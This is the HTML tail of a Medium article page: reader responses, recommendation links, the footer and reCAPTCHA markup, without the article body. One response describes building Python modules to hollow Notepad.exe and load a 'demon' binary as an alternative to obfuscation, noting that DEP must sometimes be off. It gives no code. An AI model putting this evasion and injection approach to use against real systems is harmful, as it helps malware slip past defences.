href="https://medium.com/@tylerforbes9799/awesome-post-739266d0922d?source=post_page---post_responses--733d423fc67b----0-----------------------------------" data-discover="true"><p class="bg b ec ab eb"><span>Feb 2, 2024</span></p></a></div></div><div class="bn"><button class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.385 12c0 .55.2 1.02.59 1.41.39.4.86.59 1.41.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.02.2-1.41.59-.4.39-.59.86-.59 1.41m5.62 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.42.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.03.2-1.42.59s-.58.86-.58 1.41m5.6 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.43.59s1.03-.2 1.42-.59.58-.86.58-1.41-.2-1.02-.58-1.41a1.93 1.93 0 0 0-1.42-.59c-.56 0-1.04.2-1.43.59s-.58.86-.58 1.41" clip-rule="evenodd"></path></svg></button></div></div><div class="acg m he"><pre class="vl"><div class="ach m"><div class="bg b bh ab bl"><div class="zy">Awesome post</div></div></div></pre></div><div class="aci ac r ld cw"><div class="ac r ae"><div class="ac r ld le"><div class="pw-multi-vote-icon fr lf lg lh li"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F739266d0922d&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40tylerforbes9799%2Fawesome-post-739266d0922d&amp;user=Tylerforbes&amp;userId=b708f1e7727&amp;source=---post_responses--739266d0922d----0-----------------respond_sidebar------------------" data-discover="true"><div class="lj aq lk ll lm ln ao lo lp lq li" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></a></span></div><div class="pw-multi-vote-count m lr ls lt lu lv lw lx"><p class="bg b ec ab eb"><span class="ly">--</span></p></div></div><p class="bg b ec ab bl"><button class="ah ai aj fo al am an ao ap aq ar as at rn">Reply</button></p></div></div></div></div></div><div class="vy m"><div class="bi ed"><div class="aby abz m"><div class="ac cw"><div class="ac r"><div><div class="bn" aria-describedby="76" aria-labelledby="76" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@tkutto?source=post_page---post_responses--733d423fc67b----1-----------------------------------" data-discover="true"><div class="m fr"><div class="m fr"><img alt="Trevor Kutto Hacks" class="m fk by bz ca de" width="32" height="32" loading="lazy" src="https://miro.medium.com/v2/resize:fill:32:32/1*IwGMOFu8uaLFGcePizBkNg.jpeg"><div class="gj by m bz ca fw o ak gk"></div></div></div></a></div></div></div><div class="aca m"><div class="ac r"><div><div class="bn" aria-describedby="77" aria-labelledby="77" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av ac r acb acc" rel="noopener follow" href="https://medium.com/@tkutto?source=post_page---post_responses--733d423fc67b----1-----------------------------------" data-discover="true"><div class="ac jj acb"><p class="bg b bh ab ga acd qt qu ace qw acf qx bl">Trevor Kutto Hacks</p></div></a></div></div></div></div><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@tkutto/need-more-baa49939322a?source=post_page---post_responses--733d423fc67b----1-----------------------------------" data-discover="true"><p class="bg b ec ab eb"><span>Feb 7, 2024</span></p></a></div></div><div class="bn"><button class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.385 12c0 .55.2 1.02.59 1.41.39.4.86.59 1.41.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.02.2-1.41.59-.4.39-.59.86-.59 1.41m5.62 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.42.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.03.2-1.42.59s-.58.86-.58 1.41m5.6 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.43.59s1.03-.2 1.42-.59.58-.86.58-1.41-.2-1.02-.58-1.41a1.93 1.93 0 0 0-1.42-.59c-.56 0-1.04.2-1.43.59s-.58.86-.58 1.41" clip-rule="evenodd"></path></svg></button></div></div><div class="acg m he"><pre class="vl"><div class="ach m"><div class="bg b bh ab bl"><div class="zy">need more</div></div></div></pre></div><div class="aci ac r ld cw"><div class="ac r ae"><div class="ac r ld le"><div class="pw-multi-vote-icon fr lf lg lh li"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fbaa49939322a&amp;operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40tkutto%2Fneed-more-baa49939322a&amp;user=Trevor+Kutto+Hacks&amp;userId=ef59daa0b2eb&amp;source=---post_responses--baa49939322a----1-----------------respond_sidebar------------------" data-discover="true"><div class="lj aq lk ll lm ln ao lo lp lq li" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></a></span></div><div class="pw-multi-vote-count m lr ls lt lu lv lw lx"><p class="bg b ec ab eb"><span class="ly">--</span></p></div></div><p class="bg b ec ab bl"><button class="ah ai aj fo al am an ao ap aq ar as at rn">Reply</button></p></div></div></div></div></div><div class="vy m"><div class="bi ed"><div class="aby abz m"><div class="ac cw"><div class="ac r"><div><div class="bn" aria-describedby="78" aria-labelledby="78" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@puteh?source=post_page---post_responses--733d423fc67b----2-----------------------------------" data-discover="true"><div class="m fr"><div class="m fr"><img alt="Lyxt" class="m fk by bz ca de" width="32" height="32" loading="lazy" src="https://miro.medium.com/v2/resize:fill:32:32/1*pBaUW3iwBr4bowIdsdwsHQ.png"><div class="gj by m bz ca fw o ak gk"></div></div></div></a></div></div></div><div class="aca m"><div class="ac r"><div><div class="bn" aria-describedby="79" aria-labelledby="79" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av ac r acb acc" rel="noopener follow" href="https://medium.com/@puteh?source=post_page---post_responses--733d423fc67b----2-----------------------------------" data-discover="true"><div class="ac jj acb"><p class="bg b bh ab ga acd qt qu ace qw acf qx bl">Lyxt</p></div></a></div></div></div></div><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://puteh.medium.com/im-working-on-python-modules-to-do-hollow-process-instead-of-obfuscating-for-now-notepad-exe-44930390ad9c?source=post_page---post_responses--733d423fc67b----2-----------------------------------" rel="noopener follow"><p class="bg b ec ab eb"><span>Feb 28, 2025</span></p></a></div></div><div class="bn"><button class="ah fs aj fo al am an mo ap aq ar fe mp mq me mr"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.385 12c0 .55.2 1.02.59 1.41.39.4.86.59 1.41.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.02.2-1.41.59-.4.39-.59.86-.59 1.41m5.62 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.42.59s1.02-.2 1.41-.59c.4-.39.59-.86.59-1.41s-.2-1.02-.59-1.41a1.93 1.93 0 0 0-1.41-.59c-.55 0-1.03.2-1.42.59s-.58.86-.58 1.41m5.6 0c0 .55.2 1.02.58 1.41.4.4.87.59 1.43.59s1.03-.2 1.42-.59.58-.86.58-1.41-.2-1.02-.58-1.41a1.93 1.93 0 0 0-1.42-.59c-.56 0-1.04.2-1.43.59s-.58.86-.58 1.41" clip-rule="evenodd"></path></svg></button></div></div><div class="acg m he"><pre class="vl"><div class="ach m"><div class="bg b bh ab bl"><div class="zy">Im working on python modules to do Hollow Process instead of obfuscating, for now, Notepad.exe is doing well with allocating the original demon binary, but, in some cases, my method required for DEP and other security option to be off .. <br><br>Just want…<button class="eb ai aj fo al am an ao ap aq ar as at rn lz mg">more</button></div></div></div></pre></div><div class="aci ac r ld cw"><div class="ac r ae"><div class="ac r ld le"><div class="pw-multi-vote-icon fr lf lg lh li"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F44930390ad9c&amp;operation=register&amp;redirect=https%3A%2F%2Fputeh.medium.com%2Fim-working-on-python-modules-to-do-hollow-process-instead-of-obfuscating-for-now-notepad-exe-44930390ad9c&amp;user=Lyxt&amp;userId=28367a80567a&amp;source=---post_responses--44930390ad9c----2-----------------respond_sidebar------------------" data-discover="true"><div class="lj aq lk ll lm ln ao lo lp lq li" role="presentation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></a></span></div><div class="pw-multi-vote-count m lr ls lt lu lv lw lx"><p class="bg b ec ab eb"><span class="ly">--</span></p></div></div><p class="bg b ec ab bl"><button class="ah ai aj fo al am an ao ap aq ar as at rn">Reply</button></p></div></div></div></div></div><div class="we m"><button class="bg b bh ab bl to wf wg wh mg md wi fc fd fe wj wk wl fh wm wn wo wp wq fi fj fk bn fl fm">See all responses</button></div></div></div></div><div class="wr ws wt wu wv m bx"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="acj ack dt du dv vn m"><h2 class="bg ve on il op oq io os ot ov ow ox oz pa pb pd pe bl">More from Sam Rothlisberger</h2></div><div class="acl ac ld ju acm acn aco acp acq acr acs act acu acv acw acx acy acz ada"></div><div class="vt bi ww dr ds ahf ahg ahh"></div><div class="ac uj ui jd jf jh"><a class="bg b bh ab bl to wf wg wh mg md wi fc fd fe wj wk wl fh wm wn wo wp wq fi fj fk bn fl fm" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---author_recirc--733d423fc67b---------------------------------------" data-discover="true"><div class="m fm">See all from Sam Rothlisberger</div></a></div></div></div><div class="vt bi ww ahi ahj ahk ahl ahm"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ahn aho m"><h2 class="bg ve on il op oq io os ot ov ow ox oz pa pb pd pe bl">Recommended from Medium</h2><div class="po pp pq pr ps m"><div class="acl ac ld ju acm acn aco acp acq acr acs act acu acv acw acx acy acz ada"></div></div><div class="acl ac ld ju acm acn aco acp acq acr acs act acu acv acw acx acy acz ada"></div><div class="vt bi ww dr ds ahf ahg ahh"></div><a class="bg b bh ab bl to wf wg wh mg md wi fc fd fe wj wk wl fh wm wn wo wp wq fi fj fk bn fl fm" rel="noopener follow" href="https://medium.com/?source=post_page---read_next_recirc--733d423fc67b---------------------------------------" data-discover="true"><div class="m fm">See more recommendations</div></a></div></div></div><div class="i l k"><div class="vt bi ww wx"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="wy ac ld ju"><div class="wz xa m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://help.medium.com/hc/en-us?source=post_page-----733d423fc67b---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Help</p></a></div><div class="wz xa m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://status.medium.com/?source=post_page-----733d423fc67b---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Status</p></a></div><div class="wz xa m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/about?autoplay=1&amp;source=post_page-----733d423fc67b---------------------------------------" data-discover="true"><p class="bg b ec ab eb">About</p></a></div><div class="wz xa m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----733d423fc67b---------------------------------------" data-discover="true"><p class="bg b ec ab eb">Careers</p></a></div><div class="wz xa m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="mailto:pressinquiries@medium.com" rel="noopener follow"><p class="bg b ec ab eb">Press</p></a></div><div class="wz xa m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://blog.medium.com/?source=post_page-----733d423fc67b---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Blog</p></a></div><div class="wz xa m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----733d423fc67b---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Privacy</p></a></div><div class="wz xa m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----733d423fc67b---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Rules</p></a></div><div class="wz xa m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----733d423fc67b---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Terms</p></a></div><div class="wz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://speechify.com/medium?source=post_page-----733d423fc67b---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Text to speech</p></a></div></div></div></div></div></div></div></div></div></div></div></div>





































<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><div title="reCAPTCHA" width="256" height="60" role="presentation" name="a-ubv4lk5k24wh" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp&amp;co=aHR0cHM6Ly9tZWRpdW0uY29tOjQ0Mw..&amp;hl=en&amp;v=vUgXt_KV952_-5BB2jjloYzl&amp;size=invisible&amp;anchor-ms=20000&amp;execute-ms=30000&amp;cb=h7vwpa6dlcyp" data-original-tag="iframe">

<title>reCAPTCHA</title>

<link rel="stylesheet" type="text/css" href="https://www.gstatic.com/recaptcha/releases/vUgXt_KV952_-5BB2jjloYzl/styles__ltr.css">


<div id="rc-anchor-alert" class="rc-anchor-alert"></div>

<div class="rc-anchor rc-anchor-invisible rc-anchor-light  rc-anchor-invisible-hover"><div id="recaptcha-accessible-status" class="rc-anchor-aria-status" aria-hidden="true">Recaptcha requires verification. </div><div class="rc-anchor-error-msg-container" style="display:none"><span class="rc-anchor-error-msg" aria-hidden="true"></span></div><div class="rc-anchor-normal-footer"><div class="rc-anchor-logo-large" role="presentation"><div class="rc-anchor-logo-img rc-anchor-logo-img-large"></div></div><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank">Terms</a></div></div><div class="rc-anchor-invisible-text"><span>protected by <strong>reCAPTCHA</strong></span><div class="rc-anchor-pt"><a href="https://www.google.com/intl/en/policies/privacy/" target="_blank" style="">Privacy</a><span aria-hidden="true" role="presentation"> - </span><a href="https://www.google.com/intl/en/policies/terms/" target="_blank" style="">Terms</a></div></div></div></div></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><div style="display: none;" data-original-tag="iframe"></div></div></body></html>